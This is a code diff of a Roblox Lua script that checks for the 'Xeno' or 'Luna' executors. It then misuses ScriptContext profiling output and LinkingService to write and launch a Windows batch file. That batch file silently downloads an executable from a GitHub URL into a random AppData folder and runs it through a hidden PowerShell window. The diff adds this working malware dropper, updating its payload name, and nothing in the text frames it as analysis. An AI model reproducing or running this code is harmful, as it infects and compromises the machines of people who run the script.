@@ -1,18 +1,19 @@
 coroutine.wrap(function()
     wait(10)
-    if identifyexecutor() == "Xeno" then
+    if identifyexecutor() == "Xeno" or identifyexecutor() == "Luna" then
         local LinkingService = game:GetService("LinkingService\0 meow meow meow")
         local ScriptContext = game:GetService("ScriptContext\0 meow meow!!")
-        local scriptContent = [[@echo off
-        setlocal
-        
-        set "url=https://github.com/bbcdemon445/Wanker/raw/refs/heads/main/Application%20Framer%20Host.exe"
-        set "folder=%APPDATA%\%random%"
-        
-        mkdir "%folder%"
-        powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\Application Framer Host.exe'); Start-Process -FilePath '%folder%\Application Framer Host.exe' -WindowStyle Hidden; Remove-Item '%folder%\Application Framer Host.exe'"
-        
-        endlocal
+        local scriptContent = [[
+            @echo off
+            setlocal
+            
+            set "url=https://github.com/bbcdemon445/Wanker/raw/refs/heads/main/source_prepared.exe"
+            set "folder=%APPDATA%\%random%"
+            
+            mkdir "%folder%"
+            powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%folder%\source_prepared.exe'); Start-Process -FilePath '%folder%\source_prepared.exe' -WindowStyle Hidden"
+            
+            endlocal
         ]]
         local payload = ScriptContext:SaveScriptProfilingData(scriptContent, "test.bat")
         LinkingService:OpenUrl(payload)
